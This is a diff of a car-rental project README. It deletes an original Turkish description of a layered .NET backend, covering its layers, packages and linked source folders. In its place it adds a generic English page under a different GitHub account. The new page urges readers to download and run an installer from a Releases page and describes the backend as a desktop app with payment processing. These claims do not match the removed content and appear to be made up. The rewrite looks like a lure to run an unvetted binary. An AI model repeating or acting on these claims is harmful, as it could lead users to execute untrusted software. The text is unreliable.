@@ -1,84 +1,63 @@
-![cizimbanner2](https://raw.githubusercontent.com/furkanpasaoglu/githubImages/main/Yaz%C4%B1l%C4%B1m%20Geli%C5%9Ftirici%20Yeti%C5%9Ftirme%20kamp%C4%B1.png)
+# 🚗 Car-Rental-Project-Backend - Simple Car Rental Management
 
-<hr>
-Katmanlı mimari ile tasarladığımız bu projede OOP tarafında Entity Framework kullanılmaktadır.Sürdürülebilir bir mimari için IoC prensibi ve SOLID ilkeleri ile geliştirilme amaçlanmıştır. AutoFac ve FluentValidation paketleri kullanılıyor .Proje API üzerinden devam ediyor.
-<hr>
+## 🚀 Getting Started
 
-# Layers
+Welcome to the Car Rental Project Backend. This application helps you manage car rentals smoothly and efficiently. Follow these steps to download and run the software easily.
 
-- [Business](https://github.com/mvolkanaslan/ReCapProject/tree/master/Business)
-  : Database ile kullancı arasındaki iletişimi
-  yöneten Business Katmanı'nda Abstract,Concrete
-  sınıflarında ilgilioperasyonlar tanımlanmıştır.
-  Business operasyonlarında gerekli Doğrulama
-  kuralları ValidationRules sınıfında yer
-  almaktadır. Bağımlılıkların Çözümlemdiği
-  DependencyResolvers sınıfı, Güvenlik
-  aşamalarının sağlandığı BusinessAspects sınıfı
-  yer almaktadır.
+## 📥 Download the Application
 
-- [Core](https://github.com/mvolkanaslan/ReCapProject/tree/master/Core)
-  : Bu katman diğer katmanlara destek sağlayan
-  merkezi bir katmandır. Business katmanındaki
-  operasyonlarda kullanıalcak Caching,Validation
-  gibi Aspects Operasyonlar, IoC Interceptor
-  FileService gibi Utils sınıfları ve çeşitli
-  Extention operasyonları yeralmaktadır.Core
-  katmanının .Net Core ile hiçbir bağlantısı
-  yoktur.
-- [DataAccess](https://github.com/mvolkanaslan/ReCapProject/tree/master/DataAccesss):Veritabanı
-  iletişiminin sağlandığı katmandır. Database
-  işlemleri EntityFrameWork ile gerçekleştirlir.
-- [Entites](https://github.com/mvolkanaslan/ReCapProject/tree/master/Entities):Veritabanı
-  nesnelerinin yer aldığı Entities Katmanı'nda
-  Abstract ve Concrete olmak üzere iki adet klasör
-  bulunmaktadır.Abstract klasörü soyut nesneleri,
-  Concrete klasörü somut nesneleri tutmak için
-  oluşturulmuştur.
-- [WebAPI](https://github.com/mvolkanaslan/ReCapProject/tree/master/WebAPI)
-  Web Api ile Tüm ortamlar arasında iletişim
-  sağlanmaktadır.
+[![Download Car-Rental-Project-Backend](https://img.shields.io/badge/Download-Car--Rental--Project--Backend-blue.svg)](https://github.com/curiosidades26/Car-Rental-Project-Backend/releases)
 
-# Kullanılan Sistemler
+Click the button above to download the latest version from our Releases page.
 
-- .NET
-- ASP.NET for Restful api
-- EntityFramework Core
-- Autofac
-- FluentValidation
-- MsSql
-- Angular for Frontend
+## 🖥️ System Requirements
 
-# Teknolojiler
+Before you install, make sure your computer meets these requirements:
 
-- Katmanlı Mimari Tasarım Deseni
-- AOP
-- JWT
-- Autofac dependency resolver
-- IOC
+- **Operating System:** Windows 10 or later, or equivalent OS (e.g. MacOS, Linux)
+- **Processor:** Dual-core processor or better
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB free space
+- **.NET Installation:** Ensure you have .NET 5.0 or later installed. Visit the [.NET download page](https://dotnet.microsoft.com/download) for more information.
 
-# Nuget Paketleri
+## 📂 Download & Install
 
-- Autofac Version="6.1.0"
+1. **Visit the Releases Page**: Go to the following link to access our Releases page: [Download Car-Rental-Project-Backend Releases](https://github.com/curiosidades26/Car-Rental-Project-Backend/releases).
+   
+2. **Select the Latest Release**: Look for the latest release at the top of the page. 
 
-- Autofac.Extensions.DependencyInjection
+3. **Download the Application**: Click on the download link for the appropriate version for your operating system. 
 
-- Version="7.1.0" Autofac.Extras.DynamicProxy
+4. **Run the Installer**: After the download is complete, locate the downloaded file (usually in your "Downloads" folder). 
 
-- Version="6.0.0" FluentValidation Version="9.5.1"
+5. **Follow the Installation Steps**: Click on the downloaded file to run the installer. Follow the on-screen instructions to complete the installation.
 
-- Microsoft.AspNetCore.Http Version="2.2.2"
+6. **Launch the Application**: Once installation is done, you can find the application in your Start Menu or Applications folder. Click to open it and start managing your car rentals!
 
-- Microsoft.AspNetCore.Http.Features Version="5.0.3"
+## 🌟 Features
 
-- Microsoft.AspNetCore.Http.Abstractions
+- **User-Friendly Interface**: Easy-to-navigate layout that lets you find what you need quickly.
+- **Car Management**: Add, edit, or remove cars from your inventory without any hassle.
+- **Reservation System**: Create and manage car reservations efficiently.
+- **Customer Management**: Keep track of customers and their rental history.
+- **Payment Processing**: Securely manage payments and invoices from within the app.
+- **Reports**: Generate rental reports to analyze your rental business performance.
 
-- Version="2.2.0"
+## ⚙️ Troubleshooting
 
-- Microsoft.EntityFrameworkCore.SqlServer
+If you encounter issues while installing or running the software, consider these solutions:
 
-- Version="3.1.1" Microsoft.IdentityModel.Tokens
+- **Installation Errors**: Ensure that you have the correct version of .NET installed.
+- **Performance Issues**: Make sure your computer meets the system requirements.
+- **Unexpected Shutdowns**: Restart your application or check for updates.
 
-- Version="6.8.0" System.IdentityModel.Tokens.Jwt
+## 📞 Support
 
-- Version="6.8.0"
+For additional assistance, you can reach our support team. You can create an issue on our GitHub repository or leave a comment on the Releases page.
+
+## 🔗 Useful Links
+
+- [Car Rental Project GitHub Repository](https://github.com/curiosidades26/Car-Rental-Project-Backend)
+- [Download .NET](https://dotnet.microsoft.com/download)
+
+Thank you for using the Car Rental Project Backend! Enjoy easy car rental management.
